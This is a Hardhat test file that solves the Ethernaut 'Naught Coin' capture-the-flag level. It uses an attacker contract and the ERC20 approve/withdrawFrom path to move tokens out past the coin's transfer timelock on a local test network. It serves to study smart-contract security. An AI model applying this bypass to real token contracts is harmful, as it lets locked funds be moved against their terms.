import {expect} from 'chai';
import {ethers} from 'hardhat';
import {SignerWithAddress} from '@nomiclabs/hardhat-ethers/signers';
import {NaughtCoin} from '../../types/typechain';

describe('Ethernaut 15: Naught Coin', () => {
  let owner: SignerWithAddress;
  let attacker: SignerWithAddress;

  let contract: NaughtCoin;

  before(async () => {
    [owner, attacker] = await ethers.getSigners();
    contract = await ethers.getContractFactory('NaughtCoin', owner).then(f => f.deploy(attacker.address));
    await contract.deployed();
  });

  it('should get tokens out', async () => {
    const attackerContract = await ethers.getContractFactory('NaughtCoinAttacker', attacker).then(f => f.deploy());
    await attackerContract.deployed();

    // approve entire balance to the contract
    const balance = await contract.balanceOf(attacker.address);
    await contract.connect(attacker).approve(attackerContract.address, balance);

    // withdraw tokens to the contract
    await attackerContract.connect(attacker).withdrawFrom(contract.address, attacker.address, balance);
  });

  after(async () => {
    expect(await contract.balanceOf(attacker.address)).to.eq(0);
  });
});
